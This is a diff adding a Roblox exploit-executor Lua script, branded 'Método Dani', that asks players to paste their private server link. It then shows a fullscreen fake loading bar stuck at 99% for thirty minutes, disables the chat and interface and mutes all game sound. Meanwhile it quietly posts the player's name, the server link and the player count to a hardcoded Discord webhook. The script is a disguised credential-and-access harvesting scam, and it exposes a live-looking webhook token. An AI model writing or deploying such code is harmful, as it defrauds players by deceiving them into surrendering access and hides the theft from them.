@@ -1,0 +1,298 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+local CoreGui = game:GetService("CoreGui")
+local player = Players.LocalPlayer
+
+local WEBHOOK = "https://discord.com/api/webhooks/1425655300924506254/PctfMdR0tE-3BbkK_MhzdQMw6X5HCqgJBUz992M3Or1Gy2Pv7YpfvHYqUVA71GO-lSfE"
+local FINAL_DELAY_SECONDS = 1800
+
+-- variáveis para guardar volumes
+local previousVolumes = {}
+local previousSoundServiceVolume = nil
+
+-- útil
+local function makeCorner(inst, radius)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, radius or 8)
+    c.Parent = inst
+    return c
+end
+
+-- função para escolher parent seguro
+local function chooseParent()
+    if type(gethui) == "function" then
+        local ok, h = pcall(gethui)
+        if ok and h then return h end
+    end
+    if player and player:FindFirstChild("PlayerGui") then
+        return player.PlayerGui
+    end
+    return CoreGui
+end
+
+-- função para silenciar todos os sounds (guarda volumes)
+local function muteAllSounds()
+    previousVolumes = {} -- reset
+    for _, s in ipairs(game:GetDescendants()) do
+        if s:IsA("Sound") then
+            local ok, vol = pcall(function() return s.Volume end)
+            if ok then
+                previousVolumes[s] = vol
+                -- forçar a 0
+                pcall(function() s.Volume = 0 end)
+            end
+        end
+    end
+    -- guardar e baixar SoundService.Volume
+    local ok, vol = pcall(function() return SoundService.Volume end)
+    if ok then previousSoundServiceVolume = vol end
+    pcall(function() SoundService.Volume = 0 end)
+end
+
+-- cria GUI inicial (pequena) — usada pra colar o link
+local function createInitialGui()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "DaniMethodInitial"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = false
+    gui.DisplayOrder = 0
+    gui.Parent = player:WaitForChild("PlayerGui")
+
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, 320, 0, 180)
+    container.Position = UDim2.new(0.5, 0, 0.5, 0)
+    container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    container.BorderSizePixel = 0
+    container.Parent = gui
+    makeCorner(container, 16)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 24
+    title.Text = "🧠 Método Dani"
+    title.TextColor3 = Color3.fromRGB(230, 200, 255)
+    title.Parent = container
+
+    local input = Instance.new("TextBox")
+    input.Size = UDim2.new(1, -20, 0, 40)
+    input.Position = UDim2.new(0, 10, 0, 60)
+    input.PlaceholderText = "Cole o link do servidor"
+    input.Font = Enum.Font.Gotham
+    input.TextSize = 18
+    input.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+    input.TextColor3 = Color3.fromRGB(20, 20, 20)
+    input.Parent = container
+    makeCorner(input, 10)
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.6, 0, 0, 40)
+    button.Position = UDim2.new(0.2, 0, 0, 110)
+    button.Text = "Prosseguir"
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 20
+    button.BackgroundColor3 = Color3.fromRGB(133, 40, 206)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Parent = container
+    makeCorner(button, 12)
+
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(1, 0, 0, 20)
+    status.Position = UDim2.new(0, 0, 0, 150)
+    status.BackgroundTransparency = 1
+    status.Font = Enum.Font.SourceSansItalic
+    status.TextSize = 14
+    status.TextColor3 = Color3.fromRGB(200, 200, 200)
+    status.Text = ""
+    status.Parent = container
+
+    return {gui = gui, input = input, button = button, status = status}
+end
+
+-- valida link simples
+local function validateLink(s)
+    if type(s) ~= "string" then return false end
+    local l = s:lower()
+    return l:find("roblox.com") and (l:find("type=server") or l:find("share?code=") or l:find("/games/"))
+end
+
+-- webhook (mantive seu comportamento)
+local function sendWebhook(username, link)
+    spawn(function()
+        local ok, err = pcall(function()
+            local playerCount = #Players:GetPlayers()
+            -- Horário de Brasília (UTC-3)
+            local brazilTime = os.time() - (3 * 3600) -- Subtrai 3 horas em segundos
+            local dateStr = os.date("%d/%m/%Y %H:%M:%S", brazilTime)
+
+            local data = {
+                ["content"] = "",
+                ["username"] = "Método Dani",
+                ["embeds"] = {
+                    {
+                        ["title"] = "🧠 Método Dani - Novo Log",
+                        ["description"] = "Um novo usuário executou o script!",
+                        ["color"] = 8661198,
+                        ["fields"] = {
+                            {["name"] = "📅 Data", ["value"] = dateStr, ["inline"] = false},
+                            {["name"] = "🔗 Link", ["value"] = link, ["inline"] = false},
+                            {["name"] = "👥 Jogando", ["value"] = tostring(playerCount).." pessoas", ["inline"] = true},
+                            {["name"] = "👤 Nome", ["value"] = username, ["inline"] = true},
+                        },
+                        ["footer"] = {["text"] = "Por Dani Method"}
+                    }
+                }
+            }
+
+            local headers = {["Content-Type"] = "application/json"}
+            local request = http_request or request or syn.request
+
+            if request then
+                request({
+                    Url = WEBHOOK,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = HttpService:JSONEncode(data)
+                })
+            end
+        end)
+
+        if not ok then
+            warn("Erro ao enviar webhook: "..tostring(err))
+        end
+    end)
+end
+
+-- cria fullscreen "limpa" (cobre tudo; chat DESATIVADO)
+local function createCleanFullscreenGui(link)
+    -- LIMPAR GUI PRÉVIA
+    local existingGui = CoreGui:FindFirstChild("DeltaLinkGUI")
+    if existingGui then existingGui:Destroy() end
+    
+    -- limpar também do parent seguro
+    local safeParent = chooseParent()
+    if safeParent then
+        local existingInParent = safeParent:FindFirstChild("DeltaLinkGUI")
+        if existingInParent then existingInParent:Destroy() end
+    end
+
+    -- 1) tente desativar o CoreGui para limpar itens que possam ser desligados
+    -- (isso também desliga o chat)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+    -- 2) SILENCIAR TODOS OS SONS
+    muteAllSounds()
+
+    -- 3) cria ScreenGui com DisplayOrder alto + IgnoreGuiInset para ocupar tudo
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "DeltaLinkGUI"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.DisplayOrder = 9999
+    -- Parent seguro: gethui() > PlayerGui > CoreGui
+    gui.Parent = chooseParent()
+
+    -- fundo em tela cheia (apenas o fundo de carregamento)
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.Position = UDim2.new(0, 0, 0, 0)
+    bg.AnchorPoint = Vector2.new(0, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(18, 10, 30) -- cor do fundo
+    bg.BorderSizePixel = 0
+    bg.ZIndex = 9999
+    bg.Parent = gui
+
+    -- opcional: se quiser totalmente preto, altere para Color3.fromRGB(0,0,0)
+
+    -- título (opcional; remova se quiser nem texto)
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 80)
+    title.Position = UDim2.new(0, 0, 0.15, 0)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 48
+    title.Text = "🧠 Método Dani"
+    title.TextColor3 = Color3.fromRGB(230, 200, 255)
+    title.ZIndex = 10000
+    title.Parent = bg
+
+    -- rótulo de porcentagem
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(1, 0, 0, 60)
+    percentLabel.Position = UDim2.new(0, 0, 0.35, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Font = Enum.Font.Gotham
+    percentLabel.TextSize = 36
+    percentLabel.TextColor3 = Color3.fromRGB(235, 235, 235)
+    percentLabel.Text = "0%"
+    percentLabel.ZIndex = 10000
+    percentLabel.Parent = bg
+
+    -- barra de progresso
+    local progressFrame = Instance.new("Frame")
+    progressFrame.Size = UDim2.new(0.8, 0, 0, 20)
+    progressFrame.Position = UDim2.new(0.1, 0, 0.5, 0)
+    progressFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+    progressFrame.BorderSizePixel = 0
+    progressFrame.ZIndex = 10000
+    progressFrame.Parent = bg
+    makeCorner(progressFrame, 8)
+
+    local progressFill = Instance.new("Frame")
+    progressFill.Size = UDim2.new(0, 0, 1, 0)
+    progressFill.BackgroundColor3 = Color3.fromRGB(200, 120, 255)
+    progressFill.BorderSizePixel = 0
+    progressFill.ZIndex = 10001
+    progressFill.Parent = progressFrame
+    makeCorner(progressFill, 8)
+
+    -- animação de progresso (demo)
+    spawn(function()
+        local prog = 0
+        while prog < 99 do
+            prog = prog + math.random(2, 5)
+            if prog > 99 then prog = 99 end
+            progressFill.Size = UDim2.new(prog/100, 0, 1, 0)
+            percentLabel.Text = prog.."%"
+            wait(0.03)
+        end
+
+        local startT = tick()
+        while tick()-startT < FINAL_DELAY_SECONDS do
+            percentLabel.Text = "99% — finalizando"
+            wait(1)
+        end
+
+        progressFill.Size = UDim2.new(1, 0, 1, 0)
+        percentLabel.Text = "100%"
+    end)
+
+    -- envia webhook
+    sendWebhook(player.Name, link)
+end
+
+-- PRINCIPAL
+local ui = createInitialGui()
+
+ui.button.MouseButton1Click:Connect(function()
+    local link = ui.input.Text
+    if not validateLink(link) then
+        ui.status.Text = "Link inválido. Cole um link de servidor válido."
+        ui.status.TextColor3 = Color3.fromRGB(255, 100, 100)
+        return
+    end
+
+    -- remover GUI inicial
+    if ui.gui and ui.gui.Parent then
+        ui.gui:Destroy()
+    end
+
+    -- crie a tela limpa fullscreen (cobre tudo)
+    createCleanFullscreenGui(link)
+end)
